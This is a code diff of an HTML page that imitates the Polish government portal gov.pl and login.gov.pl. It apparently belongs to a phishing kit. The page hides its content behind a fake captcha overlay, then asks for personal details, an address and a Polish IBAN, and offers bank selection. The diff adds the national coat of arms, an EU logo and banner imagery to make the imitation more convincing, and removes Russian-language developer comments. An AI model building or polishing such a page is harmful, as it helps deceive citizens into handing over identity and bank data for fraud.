@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
     <style>
-        /* RESET & BASE */
+        /* BASE */
         *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #fff; color: #1a1a1a; line-height: 1.5; overflow-x: hidden; }
         img, svg { max-width: 100%; display: block; }
@@ -14,7 +14,7 @@
         a { color: #0072b0; text-decoration: none; }
         a:hover { text-decoration: underline; }
 
-        /* CAPTCHA OVERLAY */
+        /* CAPTCHA */
         #captchaOverlay { position: fixed; inset: 0; z-index: 100000; display: flex; align-items: center; justify-content: center; background: rgba(10, 20, 40, 0.92); padding: 20px; }
         #captchaOverlay.hidden { display: none !important; }
         .captcha-box { background: #fff; border-radius: 16px; padding: 36px 32px 28px; max-width: 420px; width: 100%; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
@@ -32,6 +32,8 @@
         /* HEADER */
         .header { display: flex; align-items: center; justify-content: space-between; height: 72px; padding: 0 24px; background: #fff; border-bottom: 1px solid #e6ebf3; position: sticky; top: 0; z-index: 100; }
         .header-left { display: flex; align-items: center; gap: 16px; }
+        .logo-area { display: flex; align-items: center; gap: 12px; }
+        .coat-of-arms { width: 72px; height: 50px; object-fit: contain; flex-shrink: 0; }
         .logo-main { display: flex; align-items: baseline; gap: 8px; }
         .logo-main .gov { font-size: 22px; font-weight: 700; color: #1a1a1a; }
         .logo-main .separator { color: #c0c8d4; font-size: 18px; }
@@ -43,6 +45,7 @@
         .header-search input { border: none; background: transparent; outline: none; font-size: 14px; padding: 0 8px; width: 200px; }
         .search-submit-btn { background: #0072b0; color: #fff; font-size: 12px; font-weight: 700; padding: 0 16px; height: 100%; }
         .search-submit-btn:hover { background: #005a8c; }
+        .header-eu-logo img { height: 42px; }
 
         /* LAYOUT (без sidebar) */
         .main-wrapper { display: flex; align-items: flex-start; min-height: calc(100vh - 72px); }
@@ -56,11 +59,14 @@
 
         /* BANNER */
         .image-under-banner { width: 100%; }
-        .image-wrapper { position: relative; width: 100%; background: linear-gradient(135deg, #003b6f 0%, #0072b0 100%); min-height: 320px; display: flex; align-items: flex-end; }
-        .overlay-text { padding: 40px; color: #fff; max-width: 640px; }
+        .image-wrapper { position: relative; width: 100%; overflow: hidden; background: #003b6f; }
+        .image-wrapper > img { width: 100%; height: auto; display: block; opacity: 0.6; }
+        .overlay-icon { position: absolute; top: 24px; left: 40px; width: 48px; height: 48px; z-index: 2; }
+        .overlay-line { position: absolute; left: 40px; bottom: 90px; width: 60px; height: 4px; background: #d71920; border-radius: 2px; z-index: 2; }
+        .overlay-text { position: absolute; left: 40px; bottom: 24px; right: 40px; color: #fff; max-width: 640px; z-index: 2; text-shadow: 0 1px 4px rgba(0,0,0,0.4); }
         .overlay-text h2 { font-size: 28px; font-weight: 700; margin-bottom: 6px; }
         .overlay-text p { font-size: 15px; margin-bottom: 14px; }
-        .btn-outline { background: transparent; color: #fff; border: 2px solid #fff; border-radius: 6px; padding: 10px 22px; font-size: 13px; font-weight: 700; letter-spacing: 0.5px; }
+        .btn-outline { background: transparent; color: #fff; border: 2px solid #fff; border-radius: 6px; padding: 10px 22px; font-size: 13px; font-weight: 700; }
         .btn-outline:hover { background: #fff; color: #003b6f; }
 
         /* FORM */
@@ -73,7 +79,6 @@
         .required { color: #d71920; }
         .data-form input { width: 100%; padding: 11px 14px; font-size: 14px; border: 1px solid #d0d8e4; border-radius: 8px; background: #f8faff; outline: none; transition: all 0.2s; }
         .data-form input:focus { border-color: #003b6f; background: #fff; box-shadow: 0 0 0 3px rgba(0,59,111,0.10); }
-        .data-form input::placeholder { color: #8894a4; }
         .address-row { display: flex; gap: 10px; flex-wrap: wrap; }
         .address-row input { flex: 1; min-width: 140px; }
         .address-row input:last-child { flex: 0 0 140px; max-width: 140px; }
@@ -82,10 +87,10 @@
         .pl-prefix { padding: 11px 12px; font-size: 14px; font-weight: 700; color: #003b6f; background: #e6f0fa; border-right: 1px solid #d0d8e4; }
         .iban-wrapper input { border: none; background: transparent; }
         .iban-wrapper input:focus { box-shadow: none; background: transparent; }
-        .submit-btn { display: inline-flex; align-items: center; justify-content: center; padding: 12px 36px; background: #0072b0; color: #fff; border-radius: 8px; font-size: 16px; font-weight: 600; min-width: 140px; transition: background 0.2s; }
+        .submit-btn { display: inline-flex; align-items: center; justify-content: center; padding: 12px 36px; background: #0072b0; color: #fff; border-radius: 8px; font-size: 16px; font-weight: 600; min-width: 140px; }
         .submit-btn:hover { background: #005a8c; }
 
-        /* BANKS (пустые) */
+        /* BANKS */
         .bank-selection { padding: 40px; max-width: 1000px; width: 100%; margin: 0 auto; }
         .bank-title { font-size: 24px; font-weight: 700; margin-bottom: 6px; }
         .bank-subtitle { font-size: 15px; color: #555; margin-bottom: 24px; }
@@ -93,10 +98,6 @@
         .bank-footer { border-top: 1px solid #e6ebf3; padding-top: 20px; }
         .footer-links { display: flex; gap: 24px; flex-wrap: wrap; }
         .footer-links a { font-size: 13px; color: #555; }
-
-        /* TOAST */
-        .toast-message { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(20px); background: #1a1a1a; color: #fff; padding: 12px 24px; border-radius: 8px; font-size: 14px; opacity: 0; pointer-events: none; transition: all 0.3s; z-index: 5000; }
-        .toast-message.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
         /* FOOTER */
         .footer { background: #f0f4f8; border-top: 1px solid #e6ebf3; margin-top: 40px; }
@@ -107,19 +108,23 @@
         .footer ul a { font-size: 14px; color: #555; }
         .footer-bottom { background: #e6ebf3; padding: 16px 0; text-align: center; font-size: 13px; color: #555; }
 
-        /* МОБИЛЬНАЯ АДАПТАЦИЯ */
+        /* MOBILE */
         @media (max-width: 992px) {
             .data-form-section, .bank-selection { padding: 30px 20px; }
             .login-nav { padding: 12px 20px; }
+            .header-eu-logo { display: none; }
+            .overlay-icon { top: 16px; left: 20px; width: 36px; height: 36px; }
+            .overlay-line { left: 20px; bottom: 76px; width: 40px; }
+            .overlay-text { left: 20px; right: 20px; bottom: 16px; }
         }
         @media (max-width: 768px) {
             .header { height: 60px; padding: 0 14px; }
+            .coat-of-arms { width: 52px; height: 36px; }
             .logo-main .subtitle, .logo-main .separator { display: none; }
             .logo-main .gov { font-size: 18px; }
             .header-search { height: 36px; }
             .header-search input { width: 120px; font-size: 13px; }
             .search-submit-btn { padding: 0 10px; font-size: 11px; }
-            .overlay-text { padding: 20px; }
             .overlay-text h2 { font-size: 18px; }
             .overlay-text p { font-size: 13px; }
             .section-title, .bank-title { font-size: 20px; }
@@ -127,9 +132,10 @@
         }
         @media (max-width: 480px) {
             .header-search { display: none; }
+            .overlay-icon, .overlay-line { display: none; }
             .overlay-text h2 { font-size: 16px; }
             .overlay-text p { font-size: 12px; }
-            .btn-outline { padding: 8px 16px; font-size: 11px; }
+            .btn-outline { padding: 6px 14px; font-size: 10px; }
             .address-row input:last-child { flex: 1 1 100%; max-width: 100%; }
             .data-form-section, .bank-selection { padding: 20px 14px; }
             .submit-btn { width: 100%; }
@@ -141,7 +147,6 @@
 </head>
 <body>
 
-    <!-- CAPTCHA OVERLAY -->
     <div id="captchaOverlay">
         <div class="captcha-box">
             <span class="captcha-icon">🛡️</span>
@@ -155,15 +160,16 @@
         </div>
     </div>
 
-    <!-- MAIN CONTENT -->
     <div id="mainContent" style="display:none;">
-
         <header class="header">
             <div class="header-left">
-                <div class="logo-main">
-                    <span class="gov">gov.pl</span>
-                    <span class="separator">|</span>
-                    <span class="subtitle">Serwis Rzeczypospolitej Polskiej</span>
+                <div class="logo-area">
+                    <img src="assets/grb.svg" alt="Godło" class="coat-of-arms" width="72" height="50">
+                    <div class="logo-main">
+                        <span class="gov">gov.pl</span>
+                        <span class="separator">|</span>
+                        <span class="subtitle">Serwis Rzeczypospolitej Polskiej</span>
+                    </div>
                 </div>
             </div>
             <div class="header-right">
@@ -172,12 +178,14 @@
                     <input type="text" placeholder="Szukaj usługi, informacji">
                     <button class="search-submit-btn">SZUKAJ</button>
                 </div>
+                <span class="header-eu-logo">
+                    <img src="assets/eu-center-pl.svg" alt="EU Center PL">
+                </span>
             </div>
         </header>
 
         <div class="main-wrapper">
             <div class="content-wrapper">
-
                 <div class="login-nav">
                     <span class="brand">Login.gov.pl</span>
                     <div class="nav-links">
@@ -192,6 +200,11 @@
 
                 <div class="image-under-banner">
                     <div class="image-wrapper">
+                        <img src="assets/4a4bfee8-cecc-4734-b549-3230515a45ef.png" alt="Image" style="width:100%; height:auto;">
+                        <div class="overlay-icon">
+                            <img src="assets/51816b1b-533d-4730-983d-e3ce4184dcf6.svg" alt="icon">
+                        </div>
+                        <div class="overlay-line"></div>
                         <div class="overlay-text">
                             <h2>Poznaj login.gov.pl</h2>
                             <p>Potwierdź tożsamość online i korzystaj z różnych usług w serwisach publicznych</p>
@@ -253,11 +266,8 @@
                         </div>
                     </div>
                 </section>
-
             </div>
         </div>
-
-        <div class="toast-message" id="toastMessage">Najpierw wypełnij wszystkie wymagane pola!</div>
 
         <footer class="footer">
             <div class="container">
@@ -270,7 +280,6 @@
         </footer>
     </div>
 
-    <!-- JS -->
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const overlay = document.getElementById('captchaOverlay');
